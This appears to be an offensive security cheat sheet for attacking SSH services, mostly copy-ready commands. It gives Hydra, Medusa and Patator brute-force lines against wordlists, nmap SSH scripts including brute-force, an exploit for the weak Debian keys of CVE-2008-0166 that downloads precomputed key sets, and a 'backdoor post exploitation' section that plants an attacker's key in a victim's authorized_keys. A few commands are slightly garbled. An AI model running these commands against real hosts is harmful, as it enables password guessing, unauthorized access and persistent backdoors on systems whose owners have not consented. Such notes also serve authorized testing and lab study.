## CHECKS
```bash
# Try easy username-password combinations  
# Check for username enumeration vulnerabilities  
# Check version for vulnerabilities
# Try brute force with Hydra, Medussa, ... (Only when getting desperate)
```
## LOGIN 
```bash
sudo nc $ip 22
sudo ssh root@$ip 

# WITH PRIVATE KEY
sudo ssh -i private.key root@$ip 
```
## BRUTE FORCE CREDS
```bash
sudo hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 16 $ip ssh   
```
## NMAP SSH SCRIPTS
```bash
# VIEW SCRIPTS
ls -la /usr/share/nmap/scripts/*ssh*  

# SSH SCRIPTS
/usr/share/nmap/scripts/ssh2-enum-algos.nse
/usr/share/nmap/scripts/ssh-auth-methods.nse
/usr/share/nmap/scripts/ssh-brute.nse
/usr/share/nmap/scripts/ssh-hostkey.nse
/usr/share/nmap/scripts/ssh-publickey-acceptance.nse
/usr/share/nmap/scripts/ssh-run.nse
/usr/share/nmap/scripts/sshv1.nse

sudo nmap -p 22 -sV -Pn -T4 --script=ssh* $ip

# EXCLUDING BRUTE FORCE
sudo nmap -p 22 --script ssh2-enum-algos.nse,ssh-auth-methods.nse,ssh-publickey-acceptance.nse,sshv1.nse,ssh-hostkey.nse $ip
```
## CONFIG MISCONFIGUARATIONS
```bash
# ROOT LOGIN
# How to disable root login for openSSH
- Edit SSH server configuration sudoedit /etc/ssh/sshd_config
- Change #PermitRootLogin yes into PermitRootLogin no
- Take into account configuration changes: sudo systemctl daemon-reload
- Restart the SSH server sudo systemctl restart sshd
```
## SSH BACKDOOR POST EXPLOITATION
```bash
# ATTACKER MACHINE
ssh-keygen -f myshell  
chmod 0600 myshell  
cat myshell.pub | pbcopy 

# VICTIM MACHINE
cat myshell.pub > authorized_keys
echo myshell.pub >> <PATH>/.ssh/authorized\_keys

# CONNECT
sudo ssh -i myshell root@$ip

# PRIVATE KEY PERMISSION
chmod 0600 private.key
```
## EXPLOIT

```bash
# CVE-2008-0166
All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.  
  
https://www.exploit-db.com/exploits/5720  
  
wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2  
  
bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2  
tar -xvf debian_ssh_rsa_2048_x86.tar  
tar -xvf debian_ssh_dsa_1024_x86.tar  
  
python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>  
python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
```
## SSH BRUTE FORCE
```bash
# HYDRA
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.100.6 -t 4 ssh  
sudo hydra -v -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 $ip ssh  
sudo hydra -l gibson -P /tmp/alpha.txt -T 20 $ip ssh`  
sudo hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV

# PATATOR
sudo patator ssh_login host=192.168.100.6 user=user password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:code=1  

# MEDUSA
sudo medusa -h 192.168.100.6 -u user -P /usr/share/wordlists/rockyou.txt -M ssh  
```
## CONFIG FILES
```bash
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```
## SSH KEY
```bash
# GENERATE id_rsa and id_rsa.pub
ssh-keygen

# Copy the contents of id_rsa.pub to victims home folder
/home/victim/.ssh/authorized_keys

# IF NO MATCHING KEY EXCHANGE 
sudo ssh 192.168.100.10 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc

# GENERATE id_rsa and id_rsa.pub
ssh-keygen -f mykey
cat mykey.pub 

- SHORTEST POSSIBLE KEY
ssh-keygen -f mykey -t rsa -b 768
# copy to authorized_key.  Omit the trailing user@host if you need a shorter key.
cat mykey.pub

# Copy the contents of mykey.pub to victims home folder
/home/victim/.ssh/authorized_keys

# PERMISSIONS
id_rsa private key - 600
id_rsa.pub - 644
.ssh - 755
authorized_keys - 600

# CONFIG FILE AND CHECKS FOR SSH KEY LOGIN
sudo nano /etc/ssh/sshd_config
PasswordAuthentication no
```

